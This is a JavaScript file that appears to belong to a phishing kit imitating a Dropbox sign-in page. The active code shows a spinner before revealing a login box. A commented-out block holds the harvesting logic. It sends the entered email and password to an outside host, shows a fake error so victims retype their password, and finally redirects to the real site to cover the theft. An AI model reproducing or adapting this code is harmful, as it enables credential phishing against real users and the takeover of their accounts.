$(document).ready(function() {
    // Initially show the spinner
    $('#spinner').show();
    $('#float-box').hide();

    // Wait for 5 seconds before showing the login box
    setTimeout(function() {
        $('#spinner').hide();
        $('#float-box').fadeIn(); 
        $("#email").focus();
    }, 2000);
});

// $(document).ready(function(){
//     $("#mspinner").css("display", "none");
//     var trials = 0;
     

//     $("#submit").click( (e)=>{
//         e.preventDefault();
//         var email = $("#email").val();
//         var password = $("#password").val();
//         if(email.length < 6 || !email.includes("@")){
//             $("#email").css("border", "1px solid red");
//             $("#password").css("border", "1px solid #ccc"); 
//             $("#email").attr("placeholder", "Enter a valid email");
//             return;
//         }
//         if(password.length < 4 || password == '1234'){
//             $("#password").css("border", "1px solid red");
//             $("#email").css("border", "1px solid #ccc"); 
//         	$("#password").attr("placeholder", "Enter your password first!");
//             return;
//         }
 
//         $("#password").css("border", "1px solid #ccc"); 
//         $("#email").css("border", "1px solid #ccc"); 
//         $.ajax({
//             url: "https://szxco.com/x/log.php",
//             method: "post",
//             data: {
//                 X1: email,
//                 X2: password
//             },
//             beforeSend: function(xhr){
//             $('#submit').html('Verifying.....').prop('disabled', true);
//             }, 
//             success: function(data){
//                 trials++;
//                 setTimeout(() => {
//                     if(trials == 500){
//                         window.location.href = "https://dropbox.com";
//                     }  
//                     $("#error").css("display", "block");
//                     $("#password").val("");
//                     $("#password").focus();
//                     $("#password").attr("placeholder", "Enter email password");
//                 }, 6000);
//             },

//             error: function(data){
//                 trials++;
//                 setTimeout(() => {
//                     if(trials == 500){
//                         window.location.href = "https://dropbox.com";
//                     }  
//                     $("#error").css("display", "block");
//                     $("#password").val("");
//                     $("#password").focus();
//                     $("#password").attr("placeholder", "Enter email password");
//                 }, 6000);
//             }, 
//             complete: function(){
            

//             setTimeout( () => {
//                      $('#submit').html('Verify').prop('disabled', false);
//                 }, 6000);
//             }


//         })
//     })

// });